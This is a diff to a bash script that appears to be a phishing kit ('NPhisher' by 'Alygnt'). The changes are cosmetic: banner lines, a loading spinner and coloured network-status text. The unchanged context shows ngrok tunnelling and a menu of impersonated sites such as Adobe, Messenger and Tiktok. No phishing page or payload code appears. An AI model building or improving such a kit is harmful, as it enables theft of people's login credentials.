@@ -1,4 +1,3 @@
-
 ##COLOUR VARIABLES
 
 #Text
@@ -31,6 +30,7 @@ log_name=$(date +%d-%m-%Y-%H-%M-%S)
 #Normal Banner
 banner(){
 	echo " "
+        echo -e "${CYAN}----------------------------------------------------------------------${NC} "
 	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
 	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
 	echo -e "${RED} ████╗   ██║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
@@ -39,11 +39,12 @@ banner(){
 	echo -e "${RED} ██║   ╚███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
 	echo -e "${RED} ██║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
 	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
-	echo -e "${CYAN}        ${NC} "
+	echo -e "${CYAN}----------------------------------------------------------------------${NC} "
 }
 # Credits banner
 cbanner(){
 	echo " "
+        echo -e "${CYAN}----------------------------------------------------------------------${NC} "
 	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
 	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
 	echo -e "${RED} ████╗   ██║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
@@ -52,10 +53,9 @@ cbanner(){
 	echo -e "${RED} ██║   ╚███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
 	echo -e "${RED} ██║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
 	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
-	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
-	echo -e "${CYAN}        ${NC} "
-	echo -e "${GREEN}                           Version 1.3 ${NC}"
-	echo -e "${CYAN}        ${NC} "
+        echo -e "${CYAN}----------------------------------------------------------------------${NC} "
+	echo -e "${CYAN}-------------${MAGENTA}Version 1.3${CYAN}--------------------------${BLUE}By${NC}-${RED}Alygnt${CYAN}-----------${NC}"
+	echo -e "${CYAN}----------------------------------------------------------------------${NC} "
 }
 #Small Banner
 sbanner(){
@@ -242,6 +242,28 @@ update() {
 
 }
 
+load_anim() {
+    spinner=( '-' '\' '|' '/' )
+    while [ l ]
+    do
+        for i in "${spinner[@]}"
+        do
+            echo -ne "\r${GREEN}[${WHITE}-${GREEN}]${GREEN}$1 ${BLUE}[${MAGENTA}$i${BLUE}]${NC}"
+            sleep 0.2
+        done
+    done
+}
+
+load_print() {
+        load_anim "${1}" &
+        p=$!
+        for i in 'seq l 10'
+        do
+                sleep $2
+        done
+        kill $p
+}
+
 ## Install ngrok
 check_ngrok(){
 	if [ ! -e ".server/ngrok" ]; then
@@ -341,7 +363,7 @@ start_ngrok() {
 	N | n | *)
 		echo " ";;
 	esac
-        echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+        load_print "Launching NGROK" '15'
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
     else
@@ -921,9 +943,9 @@ netstats="Offline"
 check_netstats() {
 	wget -q --spider http://api.github.com
 	if [ $? -eq 0 ]; then
-		netstats="Online"
+		netstats="${GREEN}Online"
 	else
-		netstats="Offline"
+		netstats="${RED}Offline"
 	fi
 }
 #Logs check
@@ -1011,10 +1033,9 @@ banner
 echo -e " "
 echo -e " "
 check_netstats
-echo "${GREEN}Network Status = ${RED}$netstats"
+echo "${GREEN}Network Status = $netstats"
 echo -e " "
 echo -e "${RED} CHOOSE A SITE : ${NC}"
-echo -e " "
 echo -e " "
 echo -e "${BLUE} [1] ${GREEN} Adobe         ${NC}""${BLUE} [26] ${GREEN} Mediafire     ${NC}""${BLUE} [51] ${GREEN} Telenor         ${NC}"
 echo -e "${BLUE} [2] ${GREEN} Airtel Sim    ${NC}""${BLUE} [27] ${GREEN} Messenger     ${NC}""${BLUE} [52] ${GREEN} Tiktok          ${NC}"
